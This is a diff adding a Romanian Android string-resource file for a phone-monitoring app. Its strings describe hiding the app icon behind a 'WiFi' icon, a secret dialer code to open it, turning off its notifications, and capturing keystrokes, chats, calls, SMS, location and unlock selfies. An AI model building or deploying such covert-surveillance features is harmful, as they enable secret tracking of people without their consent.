@@ -1,0 +1,321 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="abc_action_bar_home_description">Navigați la ecranul de pornire</string>
+    <string name="abc_action_bar_up_description">Navigați în sus</string>
+    <string name="abc_action_menu_overflow_description">Mai multe opțiuni</string>
+    <string name="abc_action_mode_done">Terminat</string>
+    <string name="abc_activity_chooser_view_see_all">Afișați-le pe toate</string>
+    <string name="abc_activitychooserview_choose_application">Alegeți o aplicație</string>
+    <string name="abc_capital_off">DEZACTIVAȚI</string>
+    <string name="abc_capital_on">ACTIVAT</string>
+    <string name="abc_menu_alt_shortcut_label">Alt+</string>
+    <string name="abc_menu_ctrl_shortcut_label">Ctrl+</string>
+    <string name="abc_menu_delete_shortcut_label">delete</string>
+    <string name="abc_menu_enter_shortcut_label">enter</string>
+    <string name="abc_menu_function_shortcut_label">Funcție+</string>
+    <string name="abc_menu_meta_shortcut_label">Meta+</string>
+    <string name="abc_menu_shift_shortcut_label">Shift+</string>
+    <string name="abc_menu_space_shortcut_label">spațiu</string>
+    <string name="abc_menu_sym_shortcut_label">Sym+</string>
+    <string name="abc_prepend_shortcut_label">Meniu+</string>
+    <string name="abc_search_hint">Căutați…</string>
+    <string name="abc_searchview_description_clear">Ștergeți interogarea</string>
+    <string name="abc_searchview_description_query">Interogare de căutare</string>
+    <string name="abc_searchview_description_search">Căutați</string>
+    <string name="abc_searchview_description_submit">Trimiteți interogarea</string>
+    <string name="abc_searchview_description_voice">Căutare vocală</string>
+    <string name="abc_shareactionprovider_share_with">Trimiteți la</string>
+    <string name="abc_shareactionprovider_share_with_application">Trimiteți folosind %s</string>
+    <string name="abc_toolbar_collapse_description">Restrângeți</string>
+    <string name="app_log_name">Apps</string>
+    <string name="check">Dezinstalați versiunea precedentă aici:</string>
+    <string name="dialog_allow_unknown_source">Pentru a actualiza aplicația, permiteți „Instalați aplicații necunoscute”.</string>
+    <string name="dialog_battery_optim">Vă rugăm să opriți „Utilizarea Optimală a Bateriei” pentru funcționarea corectă a aplicației</string>
+    <string name="dialog_battery_optim_on">Utilizarea optimizată a bateriei e încă activată!</string>
+    <string name="dialog_battery_optim_set">":
+ - Schimbați \"Neoptimizat\" la \"Toate aplicațiile\"
+ - Găsiți și dezactivați aplicația \"%1$s\"
+ - Apăsați butonul\"Înapoi\""</string>
+    <string name="dialog_no">Nu</string>
+    <string name="dialog_ok">OK</string>
+    <string name="dialog_perm_accessibility">Vă rugăm să porniți serviciul de accesibilitate a aplicației</string>
+    <string name="dialog_perm_accessibility_on">Serviciul de accesibilitate a aplicației e încă inactiv!</string>
+    <string name="dialog_perm_app">"Vă rugăm să activați toate permisiunile aplicației: :
+ - Deschideți \"Permisiuni\"
+ - Activați toate permisiunile"</string>
+    <string name="dialog_perm_app_off">Unele permisiuni ale aplicației sunt încă dezactivate!</string>
+    <string name="dialog_perm_notif">Vă rugăm să dezactivați notificările aplicației</string>
+    <string name="dialog_perm_notif_on">Notificările sunt încă active!</string>
+    <string name="dialog_perm_overlay">Vă rugăm să activați permisiunile de \"Afișare prioritară\" pentru a obține capturi de ecran și fotografiile frontale din momentul deblocărilor.</string>
+    <string name="dialog_perm_overlay_off">Permisiunea \"Afișare prioritară\" este dezactivată!</string>
+    <string name="dialog_perm_read_notif">Vă rugăm să permiteți %1$s să citească notificările</string>
+    <string name="dialog_perm_read_notif_off">Accesul la notificările de citire este încă dezactivat!</string>
+    <string name="dialog_perm_scr">"Vă rugăm să permiteți aplicației %1$s capturarea ecranului:
+ - Activați \"Nu mai arăta\"
+ - Apăsați \"Începe acum\""</string>
+    <string name="dialog_perm_scr_off">Captura de ecran e încă dezactivată!</string>
+    <string name="dialog_perm_usage">"Vă rugăm să activați permisiunea \"Acces utilizare date\" pentru a obține capturi de ecran:
+ - Găsiți și apăsați pe aplicația \"%1$s\"
+ - Porniți Acces utilizare
+ - Apăsați butonul \"Înapoi\" de două ori"</string>
+    <string name="dialog_perm_usage_off">Permisiunea \"Acces utilizare date\" este încă dezactivată!</string>
+    <string name="dialog_pin_current">PIN curent</string>
+    <string name="dialog_pin_retype">Introduceți din nou PIN-ul</string>
+    <string name="dialog_pin_specify">PIN nou</string>
+    <string name="dialog_run_app">Pentru a deschide aplicația ascunsă tapați:</string>
+    <string name="dialog_run_app_sticker">Pentru a deschide aplicația ascunsă utilizați widget-ul \"Sticker\"</string>
+    <string name="dialog_uninstall_ask">Doriți să dezinstalați Monitor?</string>
+    <string name="dialog_update">Actualizare</string>
+    <string name="dialog_wait">Vă rugăm să așteptați…</string>
+    <string name="dialog_yes">Da</string>
+    <string name="email_msg_alarm">Abonarea expiră după %1$s.</string>
+    <string name="email_msg_alarm_renew">"
+Vă rugăm să reînnoiți abonamentul."</string>
+    <string name="email_msg_alarm_stop">Abonarea a expirat.</string>
+    <string name="email_msg_alarm_stop_logs">Dacă nu vă abonați, rapoartele cu plată vor fi șterse.</string>
+    <string name="event_count">Număr</string>
+    <string name="event_name">Eveniment</string>
+    <string name="general_password">Vă rugăm să introduceți PIN-ul</string>
+    <string name="global_settings_name">Setări</string>
+    <string name="gm_now">Acum</string>
+    <string name="hint_change_pin_new">Introduceți PIN nou</string>
+    <string name="hint_enter_pin">Introduceți PIN</string>
+    <string name="hint_sms_hiden">[Ascuns]</string>
+    <string name="ignore">Săriți această etapă</string>
+    <string name="im_log_name">MI</string>
+    <string name="inst_accessibility_activate_action">PORNIȚI SERVICIUL</string>
+    <string name="inst_accessibility_browsers_list">Chrome, Opera, Firefox, Samsung, Mint, ASUS</string>
+    <string name="inst_accessibility_caption">Selectați lista adițională de activități spre urmărire</string>
+    <string name="inst_accessibility_chats">Mesaje în chat</string>
+    <string name="inst_accessibility_chats_list">WhatsApp, Facebook Messenger, Viber, Hangouts</string>
+    <string name="inst_accessibility_hint">"Pentru a avea access la conținutul ecranului trebuie să activați serviciile de accesibilitate:
+Selectați aplicația '%1$s' din listă și activați serviciul. Reveniți la această pagină (Sistemul poate închide aplicația în acest moment)"</string>
+    <string name="inst_accessibility_sites">Istoricul de căutare online</string>
+    <string name="inst_call_recording">Înregistrări apeluri telefonice</string>
+    <string name="inst_chat_recording">Înregistrări apeluri chat</string>
+    <string name="inst_chose_device_type">Selectați tipul dispozitivului</string>
+    <string name="inst_enable_location_access">Aplicația necesită acces la locație:\\n\\n1. Găsiți și atingeți setarea „Permisiuni”.\\n2. Găsiți și atingeți setarea „Locație”.\\n3. Activați: „Permiteți tot timpul”</string>
+    <string name="inst_finish_action">Finisare instalare</string>
+    <string name="inst_finish_caption">Configurare completă</string>
+    <string name="inst_finish_hint">"Instalare completată!
+Vedeți descrierea în contul Dvs."</string>
+    <string name="inst_hello_cancel">Anularea instalării</string>
+    <string name="inst_hello_caption">Pornirea opțiunii de Monitorizare a Dispozitivului</string>
+    <string name="inst_hello_hint">Dacă doriți să faceți acest dispozitiv monitorizabil, trebuie să completați toți pașii configurării. Asigurați-vă că aveți un cont înregistrat și apăsați URMĂTORUL.</string>
+    <string name="inst_license_caption">Închiderea Acordului de Licență de Utilizator</string>
+    <string name="inst_log_select_all">Toate activitățile</string>
+    <string name="inst_log_select_apps">Apps</string>
+    <string name="inst_log_select_calendar">Calendar</string>
+    <string name="inst_log_select_calls">Registrul</string>
+    <string name="inst_log_select_caption">Activitățile ce urmează a fi urmărite</string>
+    <string name="inst_log_select_contacts">Contacte</string>
+    <string name="inst_log_select_gallery">Galerie</string>
+    <string name="inst_log_select_hint">Dacă nu selectați careva opțiuni, nu le veți putea activa de la distanță. Va trebui să accesați fizic dispozitivul.</string>
+    <string name="inst_log_select_location">Locație</string>
+    <string name="inst_log_select_sms">SMS/MMS</string>
+    <string name="inst_log_select_system">Evenimente de sistem</string>
+    <string name="inst_log_select_system_hint">(Cartelă SIM, baterie, informații despre rețea)</string>
+    <string name="inst_log_select_unlock">Fotografii ale deblocărilor</string>
+    <string name="inst_log_typed_text">Text tastat</string>
+    <string name="inst_login_activate">Activare</string>
+    <string name="inst_login_caption">Vă rugăm să introduceți credențialele Dvs.</string>
+    <string name="inst_login_forgot_password">Ați uitat parola?</string>
+    <string name="inst_login_hint_email">Poștă electronică</string>
+    <string name="inst_login_hint_password">Parolă</string>
+    <string name="inst_old_version_found">Vă rugăm să dezinstalați următoarea/le versiune/i pentru evitarea posibilelor conflicte și erori:</string>
+    <string name="inst_pin_caption">Creați PIN-ul</string>
+    <string name="inst_pin_change">Schimbați PIN</string>
+    <string name="inst_pin_change_hint">PIN</string>
+    <string name="inst_pin_change_icon">Android restricționează ascunderea pictogramelor aplicației. Aplicația va apărea pe un dispozitiv sub pictograma „WiFi”.</string>
+    <string name="inst_pin_hide_app">Ascundeți icoana aplicațieiAscundeți icoana aplicației</string>
+    <string name="inst_pin_hint">Aplicația poate fi lansată prin taparea ***%1$s###</string>
+    <string name="inst_pin_turn_on">Protejați aplicația cu PIN</string>
+    <string name="inst_rec_warning">E posibil ca apelurile să nu fie înregistrate corect pe anumite modeluri de telefon Android</string>
+    <string name="inst_requiremens_a11y">Accesibilitate</string>
+    <string name="inst_requiremens_a11y_hint">Serviciul de accesibilitate este necesar pentru a oferi funcțiuni extinse de monitorizare.</string>
+    <string name="inst_requiremens_a11y_instruction">"1. Apăsați pe serviciile instalate (descărcate).
+ 2. Apăsați '%1$s'.
+ 3. Apăsați pe comutator ca să fie la Permite.
+ 4. Apăsați pe butonul de sistem ÎNAPOI până reveniți la această pagină."</string>
+    <string name="inst_requiremens_a11y_instruction_14">"
+
+ Dacă activarea serviciului este blocată, deschideți Setări>Aplicații>'%1$s', găsiți „Permite setări restricționate” și porniți-o. Dacă nu este în setări, faceți clic pe cele 3 puncte din colțul din dreapta sus, apoi porniți-l și apoi repetați activarea serviciului."</string>
+    <string name="inst_requiremens_a11y_instruction_header">Pentru a activa serviciile de accesibilitate:</string>
+    <string name="inst_requiremens_basic">Permisiuni di bază</string>
+    <string name="inst_requiremens_basic_hint">Aplicația solicită access la spațiul de stocare, setările telefonului, registrul apelurilor și contacte.</string>
+    <string name="inst_requiremens_basic_instruction">"1. Găsiți și apăsați pe setările de 'Permisiuni'.
+
+2. Activați:
+\u0009- Contacte
+\u0009- Telefon
+\u0009- Spațiu de stocare
+
+3. Apăsați butonul de sistem ÎNAPOI până la revenirea la această pagină."</string>
+    <string name="inst_requiremens_basic_instruction_26">"1. Găsiți și apăsați pe setările de 'Permisiuni'.
+
+2. Activați:
+\u0009- Registrul apelurilor
+\u0009- Contacte
+\u0009- Telefon
+\u0009- Spațiu de stocare
+
+3. Apăsați butonul de sistem ÎNAPOI până la revenirea la această pagină."</string>
+    <string name="inst_requiremens_basic_instruction_header">Pentru a acorda permisiuni:</string>
+    <string name="inst_requiremens_battery">Dezactivați Optimizarea Bateriei</string>
+    <string name="inst_requiremens_battery_hint">Permiteți ca aplicația să deruleze pe fundal (Optimizarea Bateriei Oprită) pentru a preveni închiderea aplicației din cauza setărilor de econimisire a bateriei.</string>
+    <string name="inst_requiremens_caption">Cerințele aplicației</string>
+    <string name="inst_requiremens_everything_ready">Aproape gata! Doar câteva lucruri!</string>
+    <string name="inst_requiremens_files_access_header">Pentru a permite accesul la stocare:</string>
+    <string name="inst_requiremens_files_access_instruction">1. Derulați lista până când vedeți aplicația <b>"'%1$s'"</b>".
+
+2. "<b>Activați</b>" comutatorul pentru a acorda permisiunea.
+
+3. Atingeți butonul "<b>ÎNAPOI</b> de sistem până când reveniți la această pagină.</string>
+    <string name="inst_requiremens_hint">Vă rugăm să activați toate opțiunile din listă pentru o corectă funcționare a aplicației</string>
+    <string name="inst_requiremens_notifications">Dezactivați Notificările Aplicației</string>
+    <string name="inst_requiremens_notifications_access">Acces la Notificări</string>
+    <string name="inst_requiremens_notifications_access_hint">Această permisiune permite citirea notificărilor.</string>
+    <string name="inst_requiremens_notifications_access_instruction">1. Derulați lista până când vedeți aplicația <b>„%1$s”</b>". 
+
+2. "<b>Activați</b>" comutatorul pentru a acorda permisiunea. 
+
+3. "<b>Atingeți</b> <b>Permite</b>". 
+
+4. Atingeți butonul "<b>ÎNAPOI</b> de sistem până când reveniți la această pagină.</string>
+    <string name="inst_requiremens_notifications_access_instruction_header">Pentru a permite accesul la notificări:</string>
+    <string name="inst_requiremens_notifications_hint">Notificările de la această aplicație ar trebui să fie ÎNCHISE deoarece pot fi prea deranjante.</string>
+    <string name="inst_requiremens_notifications_instruction">"1. Găsiți și apăsați pe secțiunea 'Notificări'.
+
+2. "<b>Apăsați pe</b>" comutator ca să fie la OPRIT.
+
+3. Apăsați pe butonul de sistem "<b>ÎNAPOI</b> până reveniți la această pagină.</string>
+    <string name="inst_requiremens_notifications_instruction_26">1. <b>ÎNCHIDEȚI</b>" comutarea 'Arată notificări'.
+
+2. Apăsați pe butonul de sistem "<b>ÎNAPOI</b> pentru a reveni la această pagină.</string>
+    <string name="inst_requiremens_notifications_instruction_header">Pentru a dezactiva notificările acestei aplicații:</string>
+    <string name="inst_requiremens_overlay">Permisiune de suprapunere</string>
+    <string name="inst_requiremens_overlay_hint">Această aplicație ar trebui să fie vizualizată prioritar față altele.</string>
+    <string name="inst_requiremens_usage">Acces la Utilizare</string>
+    <string name="inst_requiremens_usage_hint">Această permisiune oferă posibilitatea de a urmări activitatea celorlalte aplicații.</string>
+    <string name="inst_requiremens_usage_instruction">1. Derulați lista până vedeți aplicația <b>"'%1$s'"</b>".
+
+2. "<b>Apăsați pe</b>" aplicație.
+
+3. "<b>Apăsați pe</b>" comutator ca să fie la pornit.
+
+4. Apăsați pe butonul de sistem "<b>ÎNAPOI</b> până reveniți la această pagină.</string>
+    <string name="inst_requiremens_usage_instruction_header">Pentru a permite accesul de utilizare:</string>
+    <string name="inst_screenshots_caption">Ce tipuri de Capturi de Ecran doriți să înregistrați?</string>
+    <string name="inst_screenshots_hint">"Trebuie să permiteți dispozitivului să efectueze capturi de ecran fără confirmări ulterioare. Apăsați pe 'Nu mai arăta' atunci când apare fereastra respectivă și apăsați pe butonul ÎNCEPE ACUM."</string>
+    <string name="inst_screenshots_im">a mesageriei instantanee</string>
+    <string name="inst_screenshots_sms">a SMS/MMS</string>
+    <string name="inst_screenshots_timer">Datate, a activității curente</string>
+    <string name="inst_screenshots_title">Capturi de ecran:</string>
+    <string name="inst_screenshots_web">a căutărilor online</string>
+    <string name="inst_type_caption">Vă rugăm să confirmați că această aplicație va fi utilizată corespunzător</string>
+    <string name="inst_type_confirmation">Confirm că, proprietarul dispozitivului este informat despre instalarea aplicației de monitorizare și a oferit acordul său explicit</string>
+    <string name="inst_type_employee">Dispozitivul angajatului meu</string>
+    <string name="inst_type_intention">Voi utiliza aplicația pentru a monitoriza:</string>
+    <string name="inst_type_kids">Dispozitivul copilului meu</string>
+    <string name="inst_type_own">Dispozitivul meu</string>
+    <string name="license_accept">Accept</string>
+    <string name="license_read">Am citit și înțeleg termenii</string>
+    <string name="license_text"><b>1.</b>" Sunteți conștient despre faptul că acest software poate înregistra, stoca și transmite informații despre utilizarea dispozitivului și activitatea utilizatorului. 
+ 
+"<b>2.</b>" Utilizarea acestui software este permisă doar cu respectarea următoarelor condiții: 
+Utilizați software-ul pe un dispozitiv în posesia Dvs. 
+Aveți consimțământul explicit, în scris, a proprietarului dispozitivului ce va fi monitorizat; 
+Sunteți tutorele legal al utilizatorului dispozitivului ce va fi monitorizat; 
+ 
+"<b>3.</b> Cunoașteți și vă supuneți legilor și reglementărilor ce țin de confidențialitate, iar utilizarea acestui software de monitorizare în jurisdicția Dvs. Vă asumați în totalitate responsabilitatea pentru instalarea sau utilizarea software-ului. Dezvoltatorii, vânzătorii sau distributorii acestui software nu pot fi considerați responsabili pentru oricare încălcare a legii sau consecințele ce rezultă din instalarea sau utilizarea software-ului.</string>
+    <string name="log_files_name">Galerie</string>
+    <string name="log_name_audio">Audio</string>
+    <string name="log_name_file">Fișier</string>
+    <string name="log_name_gif">Gif</string>
+    <string name="log_name_image">Imagine</string>
+    <string name="log_name_sticker">Autocolant</string>
+    <string name="log_name_video">Video</string>
+    <string name="menu_change_email">Schimbați setările de poștă electronică</string>
+    <string name="menu_change_pin">Schimbați PIN-ul aplicației</string>
+    <string name="menu_check_app_state">Verificați permisiunile aplicației</string>
+    <string name="menu_check_update">Verificați disponibilitatea actualizărilor</string>
+    <string name="menu_clear">Ștergeți registrul local</string>
+    <string name="menu_close">Închideți</string>
+    <string name="menu_disable_pin_protection">Opriți protejarea cu PIN</string>
+    <string name="menu_enable_pin_protection">Porniți protejarea cu PIN</string>
+    <string name="menu_hide_icon">Ascundeți icoana %1$s</string>
+    <string name="menu_reset_app_perm">Resetați permisiunile aplicației</string>
+    <string name="menu_reset_license">Resetați licența</string>
+    <string name="menu_select_source">Schimbați sursa audio</string>
+    <string name="menu_show_icon">Arătați icoana %1$s</string>
+    <string name="menu_uninstall">Dezinstalați</string>
+    <string name="module_calendar">Calendar de evenimente</string>
+    <string name="module_calls">Apeluri</string>
+    <string name="module_contacts">Contacte</string>
+    <string name="module_location">Locație</string>
+    <string name="module_mms">MMS</string>
+    <string name="module_photo">Selfi-uri din momentul deblocărilor dispozitivului</string>
+    <string name="module_screen_shot">Capturi de ecran</string>
+    <string name="module_sim">Schimbare cartelă SIM</string>
+    <string name="module_sms">SMS</string>
+    <string name="module_web">Siteuri vizitate</string>
+    <string name="next">următorul</string>
+    <string name="search_menu_title">Căutați</string>
+    <string name="skype_call">APELEAZĂ</string>
+    <string name="skype_call_cancel">Dezactivați</string>
+    <string name="skype_call_conn">SE CONECTEAZĂ</string>
+    <string name="skype_call_end">Încheie apelul</string>
+    <string name="skype_start">"Redă mesajul audio, "</string>
+    <string name="skype_stop">Întrerupe mesajul audio</string>
+    <string name="status_Version">Versiunea aplicației:</string>
+    <string name="status_activated">Activare</string>
+    <string name="status_bar_notification_info_overflow">999+</string>
+    <string name="status_internet_connection">Nu este conexiune internet</string>
+    <string name="status_last_send">Data ultimei încărcări:</string>
+    <string name="status_last_sync">Ultima conexiune:</string>
+    <string name="status_memory_usage">Utilizarea spațiului de stocare</string>
+    <string name="status_monitor_disabled">Monitor dezactivat</string>
+    <string name="status_monitor_enabled">Monitor activat</string>
+    <string name="status_record">Înregistrare</string>
+    <string name="status_send_data_period">Perioadă de încărcare a datelor</string>
+    <string name="status_server_connected">Conectat</string>
+    <string name="status_valid">valabil până la</string>
+    <string name="status_wifi">doar Wi-Fi</string>
+    <string name="text_log_name">Text tastat</string>
+    <string name="time_day">z.</string>
+    <string name="time_hrs">o.</string>
+    <string name="time_min">m.</string>
+    <string name="time_sec">s.</string>
+    <string name="title_activity_installer">Program de instalare</string>
+    <string name="toast_digit_pin">PIN-ul trebuie să conțină doar patru caractere</string>
+    <string name="toast_empty_email">Introduceți adresa de poștă electronică</string>
+    <string name="toast_empty_password">Introduceți parola contului</string>
+    <string name="toast_empty_pin">Introduceți PIN-ul aplicației</string>
+    <string name="toast_error_activation">Eroare de activare</string>
+    <string name="toast_hide_icon">Icoana %1$s va fi ascunsă după închiderea aplicației.</string>
+    <string name="toast_length_pin">PIN-ul trebuie să conțină doar 4 caractere</string>
+    <string name="toast_license_limit">eroare de licență.</string>
+    <string name="toast_license_locked">licență blocată.</string>
+    <string name="toast_logs_cleared">Registrul local a fost șters cu succes</string>
+    <string name="toast_no_inet">Vă rugăm să verificați conexiunea internet</string>
+    <string name="toast_not_same_pin">PIN-ul nu corespunde</string>
+    <string name="toast_pin_changed">PIN schimbat cu succes</string>
+    <string name="toast_server_not_available">Serverul nu este disponibil. Verificați conexiunea internet sau încercați mai târziu.</string>
+    <string name="toast_show_icon">Icoana %1$s va fi vizibilă și după închiderea aplicației.</string>
+    <string name="toast_unkn_err">eroare necunoscută:</string>
+    <string name="toast_wrong_account_or_password">Adresă de poștă electronica sau parolă greșită.</string>
+    <string name="toast_wrong_pin">PIN greșit</string>
+    <string name="update_current_version">Versiune curentă: %1$s</string>
+    <string name="update_new_version">Versiune nouă: %1$s</string>
+    <string name="update_status_error_disable_link">Linkul pentru actualizare nu este disponibil. Încercați mai târziu.</string>
+    <string name="update_status_error_disable_server">Serverul nu este disponibil. Verificați conexiunea internet.</string>
+    <string name="update_status_error_download">Eroare la încărcarea actualizărilor</string>
+    <string name="update_status_ok_check_link">Verificarea linkului de actualizare</string>
+    <string name="update_status_ok_check_server">Verificarea accesului la server.</string>
+    <string name="update_status_ok_download_update">Descărcarea actualizărilor…</string>
+    <string name="update_status_ok_install">Instalarea actualizărilor…</string>
+    <string name="viber_change">Editare</string>
+    <string name="widget_enter_note">Introduceți text</string>
+    <string name="widget_hint">Apăsați pentru a introduce text</string>
+    <string name="widget_name">Sticker</string>
+</resources>
